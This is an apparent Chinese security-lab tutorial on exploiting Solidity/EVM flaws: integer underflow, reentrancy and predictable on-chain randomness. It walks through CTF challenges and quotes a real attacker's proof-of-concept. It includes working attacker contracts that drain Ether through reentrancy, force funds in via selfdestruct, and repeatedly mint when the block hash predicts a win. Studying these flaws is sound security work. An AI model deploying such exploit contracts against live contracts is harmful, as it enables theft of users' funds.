#  利用solidity与EVM本身的漏洞进行攻击（上）   
原创 核心基础实验室  山石网科安全技术研究院   2022-11-30 11:01  
  
**编译与执行**  
  
solidity是一种高级语言，由人类来编写，语法上类似JavaSrcipt。solidity的源代码可以由编译器编译成以太坊虚拟机(EVM)的字节码，字节码可以在EVM上运行。EVM有许多种版本的实现，但这里我们主要考虑go-ethereum的实现。  
  
  
字节码的详细介绍在：https://www.evm.codes/  
  
  
字节码的go-ethereum实现在:https://github.com/ethereum/go-ethereum/blob/master/core/vm/instructions.go  
  
  
  
  
**整数溢出**  
  
**#原理**  
  
  
solidity和EVM支持加减乘除等基础的操作，在solidity层面，整数分为有符号和无符号两种，int表示有符号，uint表示无符号，而在uint或int后面会加上一个8的倍数作为位数，上限为256位，如果没有标位数，则会被认为是256位，如uint就是uint256的别名。  
  
  
可以发现，在solidity层面，无符号整数能表示的范围是有限的，如果超过了能表示的最大范围，就会进行取模操作。  
  
  
而在EVM字节码的实现，和运算有关的字节码有Add、Sub、Mul等，查看其中的源码实现，可以发现里面的数都是256位的，而go本身不支持256位无符号整数，所以使用了一个第三方包：github.com/holiman/uint256 来实现相关的运算。  
```
func opAdd(pc *uint64, interpreter *EVMInterpreter, scope *ScopeContext) ([]byte, error) {
 x, y := scope.Stack.pop(), scope.Stack.peek()
 y.Add(&x, y)
 return nil, nil
}

// Add sets z to the sum x+y
func (z *Int) Add(x, y *Int) *Int {
 var carry uint64
 z[0], carry = bits.Add64(x[0], y[0], 0)
 z[1], carry = bits.Add64(x[1], y[1], carry)
 z[2], carry = bits.Add64(x[2], y[2], carry)
 z[3], _ = bits.Add64(x[3], y[3], carry)
 return z
}

```  
  
通过以上的源码实现可以发现，EVM在处理溢出问题时直接对溢出位进行舍弃，对结果进行取模，并没有任何异常处理。这意味着在solidity层尽管因为溢出发生了运算错误，也不会发生任何异常。  
  
  
在竞赛中，我们可以用上溢出变小，用下溢出来变大。但使用这个漏洞时需要几个前提条件：  
  
  
1. solidity源代码的的solc版本应小于0.8.0，因为这个漏洞在该版本之后就被修复。  
  
2. 所有运算是否使用SafeMath库，该库对基本运算进行包装并在溢出的时候进行回退处理。  
  
  
**#实例**  
```
// bet.sol
pragma solidity ^0.4.24;

contract bet {
    uint secret;
    address owner;
    
    mapping(address => uint) public balanceOf;
    mapping(address => uint) public gift;
    mapping(address => uint) public isbet;
    
    event SendFlag(string b64email);
    
    function Bet() public{
        owner = msg.sender;
    }
    
    function payforflag(string b64email) public {
        require(balanceOf[msg.sender] >= 100000);
        balanceOf[msg.sender]=0;
        owner.transfer(address(this).balance);
        emit SendFlag(b64email);
    }
    

    //to fuck
    
    modifier only_owner() {
        require(msg.sender == owner);
        _;
    }
    
    function setsecret(uint secretrcv) only_owner {
        secret=secretrcv;
    }
    
    function deposit() payable{
        uint geteth=msg.value/1000000000000000000;
        balanceOf[msg.sender]+=geteth;
    }
    
    function profit() {
        require(gift[msg.sender]==0);
        gift[msg.sender]=1;
        balanceOf[msg.sender]+=1;
    }
    
    function betgame(uint secretguess){
        require(balanceOf[msg.sender]>0);
        balanceOf[msg.sender]-=1;
        if (secretguess==secret)
        {
            balanceOf[msg.sender]+=2;
            isbet[msg.sender]=1;
        }
    }
    
    function doublebetgame(uint secretguess) only_owner{
        require(balanceOf[msg.sender]-2>0);
        require(isbet[msg.sender]==1);
        balanceOf[msg.sender]-=2;
        if (secretguess==secret)
        {
            balanceOf[msg.sender]+=2;
        }
    }

}

```  
  
  
这道题的flag条件为余额大于100000，这里需要大值，所以需要下溢出。源码中的减法在betgame和doublebetgame中。  
  
  
在源码中有一个函数是Bet，其第一个字母是大写的，所以该函数并不是构造函数且可以被任何外部地址调用，我们调用一下改地址，就有了管理员权限。  
  
  
再调用setsecret函数就可以设置secret，这里随便输入一个整数即可，但是要把这个数记录下来。  
  
  
调用profit函数将自己的余额加1，再调用betgame函数，此时输入正确的数，即和之前调用setsecret时设置的数，此时余额为1，通过了第一个require检查，同时余额再减1，变成0。进入到if分支，余额加2变成2，同时isbet设置成1。  
  
  
再次调用betgame函数，这里输入错误的数，即和之前设置的不同即可，此时余额大于0，通过了第一个require检查，余额减1变成1，由于数字错误，没有进入if分支，函数结束。  
  
  
调用doublebetgame函数，这里依然输入错误的数。这时余额为1，减2之后发生下溢出，通过第一个require。而此时isbet也为1，通过检查。之后余额减2，发生下溢。而由于输入的是错误的secret所以没有进入if分支，函数结束。此时就有了足够的余额去调用payforflag获取flag。  
  
  
  
  
**重入**  
  
**# 原理**  
  
  
在合约中有一个特殊的函数，回退函数，该函数没有函数名和参数，它用于接受其他地址向该合约发送的Ether。在接受到ether后就会执行回退函数中的逻辑。同时，如果外部合约调用本合约但没有指定函数签名的时候也会进入到该函数。  
  
  
在solidity中，call、transfer、send可以调用外部合约或发送ether。在使用这些函数调用或发送ether后，就会进入到目标合约的回退函数中，但回退函数中依然可以调用原合约的函数，形成递归调用。  
  
  
一般只有在进行如取款的时候会使用发送ether的功能，如：  
```
contract Bank {
    mapping(address => uint256) public balanceOf;
    ...
    function withdraw(uint256 amount) public {
        require(balanceOf[msg.sender] >= amount);
        msg.sender.call.value(amount)();
        balanceOf[msg.sender] -= amount;
    }
}

```  
  
外部地址调用withdraw函数，输入要取回的金额，发送给外部账号相应的ether，再减去相应的余额。如果在外部地址合约的回退函数中再次调用withdraw函数：  
```
contract Hacker {
    bool status = false;
    Bank b;

    constructor(address addr) public {
        b = Bank(addr);
    }

    function hack() public {
        b.withdraw(1 ether);
    }

    function() public payable {
        if (!status) {
            status = true;
            b.withdraw(1 ether);
        }
    }
}

```  
  
此时发生了递归调用，每次调用都没有执行到减少余额的部分，导致余额其实没有减少，绕过了余额检查。外部账户可以通过不断的递归调用掏空合约的所有Ether。  
  
  
在利用重入漏洞的时候需要注意：  
  
  
1. 使用call的时候会默认将剩余的所有的gas传进去，如果使用send、transfer发送ether，则会限定2300的gas，而完成重入至少要15000的gas，所以只有使用call并没有限定gas是可以利用重入。  
  
2. 发生重入的原因是状态变化发生在调用之后，所以要利用重入就要相应的状态变化在call调用之后。  
  
  
**#实例**  
```
// h4ck.sol
pragma solidity ^0.4.25;

contract owned {
    address public owner;

    constructor () 
        public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address newOwner) public 
        onlyOwner {
        owner = newOwner;
    }
}

contract challenge is owned{
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;

    mapping (address => uint256) public balanceOf;
    mapping (address => uint256) public sellTimes;
    mapping (address => mapping (address => uint256)) public allowance;
    mapping (address => bool) public winner;

    event Transfer(address _from, address _to, uint256 _value);
    event Burn(address _from, uint256 _value);
    event Win(address _address,bool _win);


    constructor (
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) public {
        totalSupply = initialSupply * 10 ** uint256(decimals);  
        balanceOf[msg.sender] = totalSupply;                
        name = tokenName;                                   
        symbol = tokenSymbol;                               
    }

    function _transfer(address _from, address _to, uint _value) internal {
        require(_to != address(0x0));
        require(_value > 0);
        
        uint256 oldFromBalance = balanceOf[_from];
        uint256 oldToBalance = balanceOf[_to];
        
        uint256 newFromBalance =  balanceOf[_from] - _value;
        uint256 newToBalance =  balanceOf[_to] + _value;
        
        require(oldFromBalance >= _value);
        require(newToBalance > oldToBalance);
        
        balanceOf[_from] = newFromBalance;
        balanceOf[_to] = newToBalance;
        
        assert((oldFromBalance + oldToBalance) == (newFromBalance + newToBalance));
        emit Transfer(_from, _to, _value);
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        _transfer(msg.sender, _to, _value); 
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);    
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }
    
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);
        balanceOf[msg.sender] -= _value;
        totalSupply -= _value;          
        emit Burn(msg.sender, _value);
        return true;
    }
    
    function balanceOf(address _address) public view returns (uint256 balance) {
        return balanceOf[_address];
    }
    
    function buy() payable public returns (bool success){
        require(balanceOf[msg.sender]==0);
        require(msg.value == 1 wei);
        _transfer(address(this), msg.sender, 1);
        sellTimes[msg.sender] = 1;
        return true;
    }
    
    
    function sell(uint256 _amount) public returns (bool success){
        require(_amount >= 100);
        require(sellTimes[msg.sender] > 0);
        require(balanceOf[msg.sender] >= _amount);
        require(address(this).balance >= _amount);
        msg.sender.call.value(_amount)();
        _transfer(msg.sender, address(this), _amount);
        sellTimes[msg.sender] -= 1;
        return true;
    }
    
    function winnerSubmit() public returns (bool success){
        require(winner[msg.sender] == false);
        require(sellTimes[msg.sender] > 100);
        winner[msg.sender] = true;
        emit Win(msg.sender,true);
        return true;
    }
    
    function kill(address _address) public onlyOwner {
        selfdestruct(_address);
    }
    
    function eth_balance() public view returns (uint256 ethBalance){
        return address(this).balance;
    }
    
}

```  
  
****  
触发flag在函数winnerSubmit函数中，需要sellTimes大于100，在sell函数中有对sellTimes的改变，并且sellTimes的改变发生在call之后，可以尝试利用重入漏洞，每调用一次sell就减去1，但是在减之前会对sellTime是否大于0进行判断。  
  
  
调用sell函数需要调用者余额大于100且合约余额大于100，对于调用者余额大于100，使用函数buy，每次传入1wei即可获取1余额，但是买之前需要余额为0，所以在调用完sell后使用transfer将余额转到另一个账户上，重复100次，即可满足条件。  
```
contract collect {
    address ad = 0x1;
    address h4ck = 0x2;

    function go (uint count) {
        for (uint i=0;i<count;i++) {
            h4ck.call(bytes4(keccak256("buy()"))).value(1)();
            h4ck.call(bytes4(keccak256("transfer(address,uint256)")) ad, 1);
        }
    }
}

```  
  
对于合约余额大于100，只需要使用自毁函数强制向合约转钱即可:  
```
contract transferForce{
    
    address owner;
    
    function () payable {
    }
    
    constructor()public{
        owner = msg.sender;
    }
    
    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }
    // 向合约强制转账
    function transfer(address to) public onlyOwner {
        selfdestruct(to);
    }
}

```  
  
最后使用重入使得sellTimes溢出，达到获取flag条件：  
```
contract re {
    address h4ck = 0x2;
    uint ret;

    function flag () {
        h4ck.call(bytes4(keccak256("winnerSubmit")));
    }

    function attack() {
        h4ck.call(bytes4(keccak256("sell(uint256)")), 0);
    }

    function () payable {
        if (ret ==0 ) {
            h4ck.call(bytes4(keccak256("sell(uint256)")), 0);
        }
    }
```  
  
  
  
  
****  
**随机数**  
  
在solidity智能合约中，可以使用timestamp, block.number等变量作为随机数的种子：  
```
bet_count[tx.origin] = bet_count[tx.origin].add(1);
        uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp)));
        uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed)));
        uint256 shark = seed_hash % MOD_NUM; // 20 
        uint256 lucky_hash = uint256(keccak256(abi.encodePacked(bet_count[tx.origin])));
        uint256 lucky = lucky_hash % MOD_NUM;

```  
  
但是这些值都是可以被“预测”到的，所谓预测，分为两种情况：  
  
  
1. 随机数的运算在之前的区块，这时如timestamp这些变量就可以被查询到，从而计算出随机数的结果。  
  
2. 随机数的运算在调用函数的交易中，这时种子变量可以直接在solidity层面获取，相当于预测了随机数。  
  
  
所以，因为EVM中没有真正的随机熵源，所以不存在真正的随机数。如果合约在完全没有预言机的情况下生成随机数，就可以利用随机数漏洞。  
  
  
**#实例**  
  
这里使用一个真实存在的攻击事件：****  
```
function publicMint() public payable {
      // 获取总供应量
        uint256 supply = totalSupply();
        // 判断铸造是否暂停
        require(!pauseMint, "Pause mint");
        // 判断是否发送了足够的Ether，这里为0.01Ether
        require(msg.value >= price, "Ether sent is not correct");
        // 判断总供应量没有超过最大值
        require(supply + 1 <= maxTotal, "Exceeds maximum supply");
        // 调用库的mint函数
        _safeMint(msg.sender, 1);
        // 获取“随机数”
        bool randLucky = _getRandom();
        // 获取新mint的NFT的ID
        uint256 tokenId = _totalMinted();
        emit NEWLucky(tokenId, randLucky);
        // 将该id的NFT是否中奖的信息保存到tokenId_luckys哈希表中
        tokenId_luckys[tokenId] = lucky;
        // 如果中奖
        if (tokenId_luckys[tokenId] == true) {
          // 向调用者发送1.9倍price的Ether，这里为0.019Ether
         require(payable(msg.sender).send((price * 190) / 100));
         require(payable(withdrawAddress).send((price * 10) / 100));
        }
    }

```  
  
项目方提供了一个mint接口，调用者首先要发送0.01Ether，之后使用_getRandom获取一个随机数，使用该随机数进行中奖，如果中奖则向调用者返0.019个Ether。  
  
  
而_getRandom的实现为：  
```
function _getRandom() private returns(bool) {
        uint256 random = uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp)));
        uint256 rand = random%2;
        if(rand == 0){return lucky = false;}
        else         {return lucky = true;}
    }

```  
  
这里使用的是block.difficulty和block.timestamp，这两个变量都可以被预测。  
  
  
黑客的poc为：  
```
function hack(uint256 counts) public {
 require(uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp)))%2 == 1, "Not lucky");
 
 for(uint256 i=0;i < counts;i++) {
  nftAddress.call.value(10000000000000000)(bytes4(keccak256("publicMint()"));
 }
} 

```  
  
开始会计算当前区块的难度和时间戳是否满足条件，如果不满足则直接回退，等下一个区块再调用。如果满足则进行循环调用，直到掏空合约中的Ether。  
  
  
  
         
  
